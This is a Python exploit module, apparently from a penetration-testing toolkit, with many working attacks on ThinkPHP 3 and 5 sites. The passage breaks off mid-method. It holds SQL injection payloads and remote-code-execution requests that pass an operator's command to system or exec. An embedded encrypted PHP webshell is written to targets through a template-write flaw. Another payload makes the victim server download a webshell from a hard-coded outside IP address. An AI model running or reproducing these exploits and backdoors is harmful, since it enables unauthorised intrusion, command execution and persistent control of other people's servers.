from util.ExpRequest import ExpRequest,Output
from ClassCongregation import random_name
import util.globalvar as GlobalVar
from urllib.parse import quote
import prettytable as pt
import base64
"""
import util.globalvar as GlobalVar
from ClassCongregation import ysoserial_payload,Dnslog
DL = Dnslog()
DL.dns_host()
DL.result()
"""
class ThinkPHP():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = env.get('timeout')
        self.retry_time = env.get('retry_time')
        self.retry_interval = env.get('retry_interval')
        self.webshell = '''
        <?php
        @error_reporting(0);
        session_start();
            $key="0c51f0ba4316a5c8";
            $_SESSION['k']=$key;
            session_write_close();
            $post=file_get_contents("php://input");
            if(!extension_loaded('openssl'))
            {
                $t="base64_"."decode";
                $post=$t($post."");
                
                for($i=0;$i<strlen($post);$i++) {
                        $post[$i] = $post[$i]^$key[$i+1&15]; 
                        }
            }
            else
            {
                $post=openssl_decrypt($post, "AES128", $key);
            }
            $arr=explode('|',$post);
            $func=$arr[0];
            $params=$arr[1];
            class C{public function __invoke($p) {eval($p."");}}
            @call_user_func(new C(),$params);
        ?>'''
        self.webshell_copy = '<?php copy("http://140.82.50.99:8080/codetest.php","codetest.php");?>'
        
    #ThinkPHP3
    def tp3_select_find_delete_sql(self):
        appName = 'thinkphp3'
        pocname = 'tp3_select_find_delete_sql'
        path = r'/index.php?m=Home&c=Index&a=test&id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--'
        method = 'get'
        desc = '[sql]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"XPATH" in r.text:
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp3_cache_file(self):
        appName = 'thinkphp3'
        pocname = 'tp3_cache_file'
        path = r"/index.php/Home/Index/get?id=%0d%0aeval($_POST['cmd']);%0d%0a//"
        path2 = r"/Application/Runtime/Temp/b068931cc450442b63f5b3d276ea4297.php"
        method = 'get'
        desc = '[sql]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                r = exprequest.get(self.url+path2, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"200" == str(r.status_code):
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp3_order_by_sql(self):
        appName = 'thinkphp3'
        pocname = 'tp3_order_by_sql'
        path = '/ThinkPHP/?order[updatexml(1,concat(0x3a,user()),1)]=1'
        method = 'get'
        desc = '[sql]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"XPATH" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp3_update_sql(self):
        appName = 'thinkphp3'
        pocname = 'tp_update_sql'
        path = r'/index.php?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20md5(520)),0x7e),1))'
        method = 'get'
        desc = '命令执行描述'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"cf67355a3333e6e143439161adc2d82" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
    
    #ThinkPHP5
    def tp5_construct_code_exec_1(self):
        appName = 'ThinkPHP'
        pocname = 'tp5_construct_code_exec_1'
        path = '/index.php?s=captcha'
        method = 'post'
        desc = '[rce]'
        data = '_method=__construct&filter[]=var_dump&method=GET&server[REQUEST_METHOD]=VuLnEcHoPoCSuCCeSS'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp5_construct_code_exec_2(self):
        appName = 'ThinkPHP'
        pocname = 'tp5_construct_code_exec_2'
        path = '/index.php?s=captcha'
        method = 'post'
        desc = '[rce]'
        data = '_method=__construct&method=GET&filter[]=var_dump&get[]=VuLnEcHoPoCSuCCeSS'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp5_construct_code_exec_3(self):
        appName = 'ThinkPHP'
        pocname = 'tp5_construct_code_exec_3'
        path = '/index.php?s=captcha'
        method = 'post'
        desc = '[rce]'
        data = 's=VuLnEcHoPoCSuCCeSS&_method=__construct&method=POST&filter[]=var_dump'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp5_construct_code_exec_4(self):
        appName = 'ThinkPHP'
        pocname = 'tp5_construct_code_exec_4'
        path = '/index.php?s=captcha'
        method = 'post'
        desc = '[rce]'
        data = 'aaaa=VuLnEcHoPoCSuCCeSS&_method=__construct&method=GET&filter[]=var_dump'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp5_construct_code_exec_5(self):
        appName = 'thinkphp5'
        pocname = 'tp5_construct_code_exec_5'
        path = '/index.php'
        method = 'post'
        desc = '[rce]'
        data = '_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo'
        data_exec = '_method=__construct&method=GET&filter[]=exec&get[]={}'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url+path, data=data_exec.format(self.cmd), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))

    def tp5_construct_code_exec_6(self):
        appName = 'thinkphp5'
        pocname = 'tp5_construct_code_exec_6'
        path = '/index.php?s=index/index/index'
        method = 'post'
        desc = '[rce]'
        data = 's=VuLnEcHoPoCSuCCeSS&_method=__construct&method&filter[]=var_dump'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"string(18) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp5_construct_code_exec_7(self):
        import time
        appName = 'thinkphp5'
        pocname = 'tp5_construct_code_exec_7'
        path = '/index.php'
        method = 'post'
        desc = '[rce]'
        data_1 = '_method=__construct&method=get&filter[]=call_user_func&server[]=-1&get[]={}'
        data_2 = '_method=__construct&method=get&filter[]=think\__include_file&server[]=-1&get[]=../runtime/log/{}/{}.log'
        now_date = time.strftime('%Y%m%d',time.localtime(time.time()))
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data_1.format('<?php phpinfo();?>'), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                #include利用发包
                r = exprequest.post(self.url+path, data=data_2.format(now_date[:6], now_date[6:]), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                exprequest.post(self.url+path, data=data_1.format(self.webshell_copy), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                #include利用发包
                exprequest.post(self.url+path, data=data_2.format(now_date[:6], now_date[6:]), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                r = exprequest.get(self.url+'/codetest.php', headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r.status_code != 404:
                    print('[*]Behinder3连接地址: %s'%(self.url+'/codetest.php'))
                else:
                    print('[-] %s 利用失败!'%pocname)
        except Exception as error:
            return output.error_output(str(error))
            
            
            
    def tp5_construct_debug_rce(self):
        appName = 'ThinkPHP'
        pocname = 'tp5_construct_debug_rce'
        path = '/index.php'
        method = 'post'
        desc = '[rce]'
        data = '_method=__construct&filter[]=var_dump&server[REQUEST_METHOD]=VuLnEcHoPoCSuCCeSS'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp5_debug_index_ids_sqli(self):
        appName = 'thinkphp'
        pocname = 'tp5_debug_index_ids_sqli'
        path = '/index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(520)),0)]=1'
        method = 'get'
        desc = '命令执行描述'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"cf67355a3333e6e143439161adc2d82" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp5_driver_display_rce(self):
        appName = 'thinkphp'
        pocname = 'tp5_driver_display_rce'
        path = r'/index.php?s=index/\think\view\driver\Php/display&content=<?php var_dump(md5(2333));?>'
        method = 'get'
        desc = '命令执行描述'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"4f97319b308ed6bd3f0c195c176bbd77" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp5_invoke_func_code_exec_1(self):
        appName = 'ThinkPHP'
        pocname = 'tp5_invoke_func_code_exec_1'
        path = r'/index.php?s=index/think\app/invokefunction&function=phpinfo&vars[0]=-1'
        method = 'get'
        desc = '[rce]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                path = r'/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=RECOMMAND'
                result = exprequest.get(self.url+path.replace('RECOMMAND', self.cmd), data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp5_invoke_func_code_exec_2(self):
        appName = 'ThinkPHP'
        pocname = 'tp5_invoke_func_code_exec_2'
        path = r'/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=((md5(2333))'
        method = 'get'
        desc = '[rce]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"56540676a129760a" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))

    def tp5_invoke_func_code_exec_3(self):
        appName = 'thinkphp5'
        pocname = 'tp5_invoke_func_code_exec_3'
        path = r'/index.php/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=1'
        path_exec = '/index.php/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=exec&vars[1][0]={}'
        method = 'get'
        desc = '[rce]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path_exec.format(quote(self.cmd)), data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))


    def tp5_method_filter_code_exec(self):
        appName = 'thinkphp'
        pocname = 'tp5_method_filter_code_exec'
        path = '/index.php'
        method = 'post'
        desc = '命令执行描述'
        data = 'c=var_dump&f=md5(2333)&_method=filter'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"f7e0b956540676a129760a3eae309294" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))

    def tp5_request_input_rce(self):
        appName = 'thinkphp'
        pocname = 'tp5_request_input_rce'
        path = r'/index.php?s=index/\think\Request/input&filter=var_dump&data=md5(2333)'
        method = 'get'
        desc = '命令执行描述'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"f7e0b956540676a129760a3eae309294" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp5_templalte_driver_rce(self):
        appName = 'thinkphp'
        pocname = 'tp5_templalte_driver_rce'
        path1 = r'/index.php?s=index/\think\template\driver\file/write&cacheFile=mqz.php&content=WEBSHELL'
        path2 = r'/index.php?s=index/\think\template\driver\File/write&cacheFile=mqz.php&content=WEBSHELL'
        path3 = '/mqz.php'
        method = 'get'
        desc = '命令执行描述'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                #windows 不区分大小写
                exprequest.get(self.url+path1.replace('WEBSHELL','<?php var_dump(md5(2333));?>'), data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                #linux 区分大小写
                exprequest.get(self.url+path2.replace('WEBSHELL','<?php var_dump(md5(2333));?>'), data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                r = exprequest.get(self.url+path3, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"56540676a129760a" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                #Windows 不区分大小写
                exprequest.get(self.url + path1.replace('WEBSHELL', quote(self.webshell)), data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                #Linux 区分大小写
                exprequest.get(self.url + path2.replace('WEBSHELL', quote(self.webshell)), data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print('[*]Behinder3连接地址 %s'%(self.url+path3))
        except Exception as error:
            return output.error_output(str(error))
            

    def tp5_query_max_sql(self):
        appName = 'thinkphp'
        pocname = 'tp5_query_max_sql'
        path = r'/index.php/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1)%20from%20users%23'
        method = 'get'
        desc = '[sql]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"XPATH" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))

    def tp5_Builder_parseData_insert_sql(self):
        appName = 'thinkphp'
        pocname = 'tp5_Builder_parseData_sql'
        path = '/index.php/index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1'
        method = 'get'
        desc = '[sql]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"XPATH" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))

    def tp5_Builder_parseData_orderby_sql(self):
        appName = 'thinkphp'
        pocname = 'tp5_Builder_parseData_orderby_sql'
        path = r'/index.php/index/index/index?order%20by\[id\`\|updatexml(1,concat(0x7,user(),0x7e),1)%23\]=1'
        method = 'get'
        desc = '[sql]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"XPATH" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp5_Mysql_parseWhereItem_select_sql(self):
        appName = 'thinkphp5'
        pocname = 'tp5_Mysql_parseWhereItem_select_sql'
        path = r'/index.php/index/index/index?username=)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)%23'
        method = 'get'
        desc = '[sql]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"XPATH" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
